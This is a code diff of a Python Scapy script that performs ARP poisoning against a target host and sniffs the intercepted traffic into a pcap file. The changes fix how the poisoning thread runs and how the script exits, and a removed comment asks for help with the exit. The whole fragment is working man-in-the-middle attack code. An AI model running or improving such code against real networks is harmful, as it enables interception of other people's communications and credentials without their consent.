@@ -54,32 +54,23 @@ poison = make_attarp(interface,target,disguise)
 
 def kill_s():
 	os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
-	os.kill(os.getpid(),signal.SIGINT)
+	print "\nExiting!"
 
 def poison_tar(posion,interface):
-	try:	
-		while True:
-			sendp(poison,inter=2,iface=interface)
-	except KeyboardInterrupt:
-		print "finish!"
-		kill_s()
+	while True:
+		sendp(poison,inter=2,iface=interface)
 	return
 
 poison_th = threading.Thread(target=poison_tar,args=(poison,interface))
+poison_th.setDaemon(True)
 poison_th.start()
+poison_th.join(0)
 print "begin!"
 
 try:
-	try:
-		packets = sniff(count=packet_count,iface=interface,filter=filter)
-	except NameError:
-		print "exit"
-		sys.exit(0)
+	packets = sniff(count=packet_count,iface=interface,filter=filter)
 	wrpcap(file_path,packets)
 	kill_s()
-	sys.exit()
 except KeyboardInterrupt:
 	kill_s()
 	sys.exit(0)
-
-#help me to modify the code it can't exit
